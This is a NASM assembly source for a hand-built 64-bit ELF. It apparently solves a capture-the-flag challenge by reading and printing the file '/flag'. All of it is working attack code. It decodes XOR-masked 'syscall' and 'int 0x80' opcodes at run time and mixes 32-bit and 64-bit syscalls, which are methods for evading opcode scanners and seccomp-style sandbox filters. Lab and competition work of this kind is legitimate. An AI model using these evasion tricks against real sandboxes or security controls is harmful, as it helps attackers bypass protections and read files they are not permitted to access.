BITS 64

              org     0x3400000000

ehdr:                                                 ; Elf64_Ehdr
              db      0x7F, "ELF", 1, 1, 1, 0         ;   e_ident
      times 8 db      0
              dw      2                               ;   e_type
              dw      0x3e                            ;   e_machine
              dd      1                               ;   e_version
              dq      _start                          ;   e_entry
              dq      0x40                            ;   e_phoff
              dd      0x34                            ;   e_shoff (fake e_ehsize)
              dd      1                               ;   e_shoff (fake e_phnum)
              dd      0                               ;   e_flags
              dw      ehsize                          ;   e_ehsize
              dw      phentsize                       ;   e_phentsize
              dw      phnum                           ;   e_phnum
              dw      0                               ;   e_shentsize
              dw      0                               ;   e_shnum
              dw      0                               ;   e_shstrndx
ehsize        equ     $ - ehdr

phdr:                                                 ; Elf64_Phdr
              dd      1                               ;   p_type
              dd      7                               ;   p_flags
              dq      0                               ;   p_offset
              dq      $$                              ;   p_vaddr
              dq      $$                              ;   p_paddr
              dq      filesize                        ;   p_filesz
              dq      filesize                        ;   p_memsz
              dq      0x1000                          ;   p_align
phentsize     equ     $ - phdr

              dd      1                               ;   p_type
              dd      7                               ;   p_flags
              dq      0                               ;   p_offset
              dq      0x1337331000                    ;   p_vaddr
              dq      0x1337331000                    ;   p_paddr
              dq      filesize                        ;   p_filesz
              dq      filesize                        ;   p_memsz
              dq      0x1000                          ;   p_align

              dd      1                               ;   p_type
              dd      7                               ;   p_flags
              dq      0                               ;   p_offset
              dq      0x40000                         ;   p_vaddr
              dq      0x40000                         ;   p_paddr
              dq      filesize                        ;   p_filesz
              dq      filesize                        ;   p_memsz
              dq      0x1000                          ;   p_align
phnum         equ     ($ - phdr) / phentsize

times 0x337 - ($ - $$) db 0
flag:
db "/flag", 0

_start:

mov ebx, 0xc380cd ^ 0x111111
xor ebx, 0x111111
mov dword [rel syscall32], ebx

mov ebx, 0xc3050f ^ 0x111111
xor ebx, 0x111111
mov dword [rel syscall64], ebx

mov rsi, 0
mov rdi, 0x1337331337
mov rax, 2
call syscall64

mov ebx, eax
mov ecx, 0x40000
mov edx, 0x100
mov eax, 3
call syscall32

mov edx, eax
mov ebx, 1
mov eax, 4
call syscall32

mov ebx, 137
mov eax, 1
call syscall32

syscall32:
dd 0

syscall64:
dd 0

filesize      equ     $ - $$

